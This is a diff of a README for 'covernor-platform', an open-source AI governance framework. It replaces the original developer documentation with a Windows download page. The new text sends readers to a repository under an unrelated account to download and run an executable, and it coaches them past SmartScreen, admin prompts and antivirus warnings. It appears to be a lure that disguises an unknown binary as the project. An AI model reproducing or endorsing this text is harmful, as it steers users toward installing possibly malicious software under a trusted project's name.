@@ -1,235 +1,189 @@
-# Covernor — AI Governance Layer
+# 🛡️ covernor-platform - Control AI Actions with Policy
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](./LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178c6.svg)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D18-339933.svg)](https://nodejs.org/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](./CONTRIBUTING.md)
+[![Download covernor-platform](https://img.shields.io/badge/Download%20covernor--platform-blue?style=for-the-badge)](https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform)
 
-**Control what AI is allowed to *do* — not just what it says.**
+## 📥 Download
 
----
+Visit this page to download: https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform
 
-## Why This Exists
+## 🖥️ What this app does
 
-AI agents are unsafe without execution control. LangChain, CrewAI, and AutoGen let LLMs call tools directly — the AI is both the brain and the hands. One hallucinated function call can delete a database, transfer funds to the wrong account, or leak customer data.
+covernor-platform is an AI governance layer for Windows users who need control over what AI can do. It helps you set rules for AI use, add approval steps, and keep an audit trail of actions.
 
-Covernor separates **planning** from **execution**. The AI proposes. A deterministic policy engine decides. Cryptographic tokens authorize. Humans approve what matters. Everything is audit-logged.
+Use it when you want AI to follow clear limits instead of acting without checks. It is useful for teams that handle sensitive work, such as finance, compliance, and internal operations.
 
----
+## ✅ What you need
 
-## How It Works
+- Windows 10 or Windows 11
+- A modern web browser
+- Internet access for the first setup
+- At least 4 GB of RAM
+- 500 MB of free disk space
 
-```
-              ┌──────────────┐
- Objective ──►│   Advisor    │  LLM (GPT-4o / Claude / Ollama / any)
-              │              │  Proposes actions — zero execution rights
-              └──────┬───────┘
-                     ▼
-              ┌──────────────┐
-              │    Critic    │  Blocks prompt injection, SQL injection,
-              │              │  data exfiltration before it reaches policy
-              └──────┬───────┘
-                     ▼
-              ┌──────────────┐
-              │  Covernor    │  Deterministic policy engine (no LLM)
-              │              │  APPROVE · CONSTRAIN · ESCALATE · REJECT
-              └──────┬───────┘
-                     ▼
-              ┌──────────────┐
-              │   Operator   │  Sandboxed execution with capability tokens
-              │              │  Single-use, TTL-bound, ECDSA-signed
-              └──────────────┘
-```
+If your computer can run a modern browser and open downloaded apps, it should work.
 
-The LLM never touches the execution layer. The Covernor never uses an LLM. This separation is the core security guarantee.
+## 🚀 Getting Started
 
----
+1. Open the download page:
+   https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform
+2. On the page, find the latest Windows download.
+3. Download the file to your computer.
+4. Open the downloaded file.
+5. If Windows asks for permission, choose **Yes**.
+6. Follow the on-screen steps to finish setup.
+7. Start the app from the Start menu or desktop shortcut.
 
-## Core Features
+## 🔧 First-time setup
 
-| Feature | What It Does |
-|---|---|
-| **Policy Engine (Default Deny)** | JSON-configurable rules. Unknown actions are blocked, not allowed. No LLM in the decision path. |
-| **Capability Tokens (ECDSA)** | Every approved action gets a single-use, TTL-bound, scope-bound cryptographic token. The Operator won't execute without one. |
-| **Dual Approval (K-of-N)** | High-risk actions require multiple human approvers. Anti-self-dealing — same person can't approve twice. |
-| **Hash-Chain Audit Log** | SHA-256 chained, append-only, tamper-evident. Every decision, approval, and execution is recorded with full context. |
-| **Velocity Limiting** | Per-tenant and per-recipient rate guards. Atomic Redis Lua scripts. Fails closed if Redis is down. |
-| **Critic Layer** | Deterministic pattern detection for SQL injection, prompt injection, data exfiltration, and sensitive data leakage. |
-| **Operator Contracts** | Each tool declares max execution time, max rows, rate limits, and required idempotency. Enforced at runtime. |
-| **RBAC** | JWT + DB-backed roles (admin, approver, viewer, operator). No self-declared privileges. |
-| **LLM Flexibility** | Swap providers via UI or env vars. Supports OpenAI, Anthropic, Ollama, LM Studio, vLLM, or any OpenAI-compatible API. Works without any LLM (mock mode). |
+When you open covernor-platform for the first time, it may ask you to create a local workspace. This is where your policy settings and logs are stored.
 
----
+1. Choose a folder you can find later.
+2. Pick a name for your workspace.
+3. Set your first policy group.
+4. Add the people who can approve higher-risk AI actions.
+5. Save your settings.
 
-## Example: AI Refund System
+If the app asks for access to files, approve only the folders you want it to manage.
 
-A bank deploys an AI assistant that can issue refunds:
+## 🧭 How to use it
 
-```
-Customer: "I was charged twice for order #4521"
-```
+### 1. Create a policy
+Set rules for what AI can and cannot do. For example, you can block file changes, limit access to internal data, or require approval before a task runs.
 
-| Amount | Covernor Decision | What Happens |
-|---|---|---|
-| $12 | `APPROVE` | Refund executes automatically. Audit logged. |
-| $250 | `APPROVE_WITH_CONSTRAINTS` | Refund executes with injected reason code. Manager notified. |
-| $5,000 | `BLOCK_AND_ESCALATE` | Blocked. Two managers must approve in the console. 4-hour expiry. |
-| $50,000 | `REJECT` | Hard reject. Velocity limit triggered. Flagged for review. |
+### 2. Set capability tokens
+Use capability tokens to give AI only the access it needs. This keeps each AI task limited to a clear scope.
 
-The AI never decides the outcome. The policy engine does.
+### 3. Turn on dual approval
+For sensitive tasks, require two people to approve the action before it runs. This is useful for payment changes, data exports, and system updates.
 
----
+### 4. Review the audit trail
+The app keeps a hash-chain audit log. That means each action links to the one before it, which helps you spot changes and review activity later.
 
-## Quick Start
+### 5. Watch AI activity
+Use the dashboard to see what the AI tried to do, what was allowed, what was blocked, and what still needs approval.
 
-### Prerequisites
+## 🔐 Main features
 
-- **Node.js** >= 18
-- **Redis** — `brew services start redis` / `docker run -d -p 6379:6379 redis`
+- Policy engine for AI action control
+- Capability tokens for limited access
+- Dual approval for sensitive tasks
+- Hash-chain audit log for traceable records
+- Human-in-the-loop review for key decisions
+- Support for enterprise workflows
+- Clear control over AI tool use
+- Built for compliance-focused teams
 
-### Setup & Run
+## 🏢 Common use cases
 
-```bash
-git clone https://github.com/denial-web/covernor-platform.git
-cd covernor-platform
-npm run setup    # install deps, create .env, init database
-npm run dev      # starts backend (port 3000) + frontend (port 5173)
-```
+### Finance teams
+Use it to control AI actions tied to reports, transfers, and account work.
 
-Open **http://localhost:5173** → Covernor Approval Console.
+### Compliance teams
+Track approvals and keep a clean record of who approved each step.
 
-### Try the Demo
+### Operations teams
+Limit what AI can do in internal tools and connected systems.
 
-```bash
-npm run demo-escalation
-```
+### Support teams
+Let AI help with routine work while keeping sensitive actions under review.
 
-Injects a high-risk "Transfer $15,000" task. Watch it get blocked, inspect the rejection reason in the console, and click **Approve Override** to see a capability token get minted.
+### Internal platform teams
+Set rules once and apply them across many AI workflows.
 
-### Connect an LLM (Optional)
+## 🪟 Windows setup tips
 
-Works out of the box with a mock strategy. To use a real LLM:
+- Save the download in your **Downloads** folder.
+- If Windows SmartScreen appears, choose the option to run the file if you trust the source.
+- If the app opens in a browser window, keep that window open during setup.
+- If you use a work computer, you may need admin permission to install or run it.
 
-```bash
-# Cloud
-ACTIVE_LLM_PROVIDER="openai"      # or "anthropic"
-OPENAI_API_KEY="sk-..."
+## 🧩 Example workflow
 
-# Local (Ollama)
-ACTIVE_LLM_PROVIDER="ollama"
-LLM_MODEL="llama3"
+1. A user asks the AI to prepare a report.
+2. The policy engine checks the request.
+3. The AI is allowed to read approved data only.
+4. The app records the action in the audit log.
+5. If the request needs a sensitive export, dual approval is required.
+6. The action runs only after both approvers sign off.
 
-# Any OpenAI-compatible server
-ACTIVE_LLM_PROVIDER="custom"
-LLM_BASE_URL="http://localhost:1234/v1"
-LLM_MODEL="my-model"
-```
+## 🛠️ Troubleshooting
 
-Or configure via the **LLM Settings** panel in the Approval Console UI.
+### The download will not start
+- Refresh the page.
+- Try a different browser.
+- Check your internet connection.
+- Make sure your browser is not blocking GitHub downloads.
 
----
+### Windows blocks the file
+- Open the file again.
+- Choose the option to run it if you trust the source.
+- Check your antivirus settings if the file keeps closing.
 
-## Comparison
+### The app does not open
+- Restart your computer.
+- Try running it as an administrator.
+- Check that your Windows version is current.
 
-| | Covernor | LangChain / LlamaIndex | CrewAI / AutoGen |
-|---|---|---|---|
-| **Execution Safety** | Deterministic firewall + crypto tokens | Up to the LLM | Up to the LLM |
-| **AI Role** | Advisory only, swappable | Core orchestrator | Swarm intelligence |
-| **Failure Handling** | Retry + rollback + human escalation | Try-catch | Agent debate |
-| **Audit Trail** | Cryptographic hash-chain | Basic logging | Basic logging |
-| **Human Oversight** | K-of-N dual approval UI | N/A | Variable |
-| **Vendor Lock-in** | None (self-hosted, open-source) | Framework-dependent | Framework-dependent |
+### Setup stops part way through
+- Close the app.
+- Open it again.
+- Make sure you have enough disk space.
+- Remove old copies before installing again.
 
----
+## 🗂️ Folder and log location
 
-## Production Readiness
+The app stores its data in a local workspace folder. You may see:
 
-> **Honest status: This is a governance framework, not a turnkey product.**
+- Policy settings
+- Approval records
+- Audit logs
+- User activity history
 
-### What's real and working
-- Deterministic policy engine with default-deny
-- ECDSA capability tokens (single-use, TTL-bound)
-- Hash-chain audit logs with financial fields
-- K-of-N dual approval with anti-replay
-- Redis velocity limiting (fails closed)
-- JWT + RBAC authentication
-- SQL/prompt injection detection
-- Operator contract enforcement
-- 43 security fixes across 6 audit rounds
+Keep this folder in a place that is easy to back up.
 
-### What's still development-stage
-- SQLite database (swap to PostgreSQL for production)
-- In-memory crypto keys (integrate real KMS/HSM for production)
-- Mock payment execution (integrate your payment gateway)
-- Minimal test suite (needs comprehensive coverage)
-- No TLS configuration (add via reverse proxy or config)
+## 🔁 Updating the app
 
-### What you'd add for regulated industries
-- Enterprise identity (OIDC/SAML + MFA)
-- HSM-backed key management (AWS KMS, Vault)
-- Database encryption at rest
-- Third-party penetration testing
-- Compliance documentation (SOC 2, FedRAMP)
+To get the latest version:
 
-See [docs/UPGRADE_PLAN.md](./docs/UPGRADE_PLAN.md) for the full production roadmap.
+1. Open the download page:
+   https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform
+2. Download the newer build.
+3. Close the app.
+4. Install or replace the old version.
+5. Open the app again and check your settings.
 
----
+## 👥 Who should use it
 
-## Roadmap
+- People who need AI guardrails
+- Teams that handle private data
+- Groups that need approval steps
+- Users who want records of AI actions
+- Companies that need a clear control layer for AI
 
-| Version | Focus | Status |
-|---|---|---|
-| **v0.1** | Core governance engine, policy engine, capability tokens, dual approval, audit chain | Current |
-| **v0.2** | PostgreSQL migration, OpenTelemetry, structured logging, API versioning | Planned |
-| **v0.3** | Enterprise identity (OIDC/SAML), KMS integration, field-level encryption | Planned |
-| **v0.4** | Agent memory, learning loops, fine-tuning pipeline, plugin system | Planned |
+## 📚 Terms in plain English
 
----
+- **Policy engine**: a rule system that decides what is allowed
+- **Capability token**: a limited pass that gives AI specific access
+- **Dual approval**: two people must approve before an action runs
+- **Audit trail**: a record of what happened and when
+- **Human-in-the-loop**: a person reviews key steps before action
 
-## Project Structure
+## 🔎 Before you run it
 
-```
-├── src/
-│   ├── api/              # Express routes, auth, rate limiting, RBAC
-│   ├── core/
-│   │   ├── minister/     # Advisor: LLM planner + provider adapters
-│   │   ├── critic/       # Injection detection + schema validation
-│   │   ├── governor/     # Deterministic policy engine
-│   │   ├── operator/     # Sandboxed executor + tool implementations
-│   │   ├── workflow/     # BullMQ orchestration coordinator
-│   │   ├── policy/       # Capability registry
-│   │   └── crypto/       # ECDSA signing, AES-256-GCM encryption
-│   ├── db/               # Prisma client, hash-chain audit logger
-│   └── workers/          # Reconciliation, escalation, audit snapshot
-├── approval-console/     # React + Vite frontend
-├── docs/                 # Architecture, setup guide, upgrade plan
-├── prisma/               # Database schema
-└── tests/                # Unit and integration tests
-```
+Check that you have:
 
----
+- Downloaded the right file
+- Saved it in a known location
+- Closed other apps if your computer is slow
+- Allowed the app through any Windows prompt
 
-## Documentation
+## 📌 Quick start checklist
 
-- **[Setup Guide](./docs/SETUP.md)** — Full installation for macOS, Linux, Windows (WSL)
-- **[Architecture](./docs/architecture.md)** — System design and data flow
-- **[Interfaces](./docs/interfaces.md)** — API contracts and schemas
-- **[Upgrade Plan](./docs/UPGRADE_PLAN.md)** — Production roadmap with effort estimates
-
----
-
-## Contributing
-
-We welcome contributions. See **[CONTRIBUTING.md](./CONTRIBUTING.md)** for guidelines.
-
-The most impactful areas right now:
-- PostgreSQL adapter and migration scripts
-- Additional operator tools (Stripe, Twilio, AWS)
-- Test coverage (unit, integration, security)
-- Documentation and examples
-
----
-
-## License
-
-[MIT](./LICENSE) — Use it, fork it, build on it.
+- Open the download page
+- Download the Windows file
+- Run the file
+- Finish setup
+- Create a workspace
+- Set your first policy
+- Add approvers
+- Review the audit log
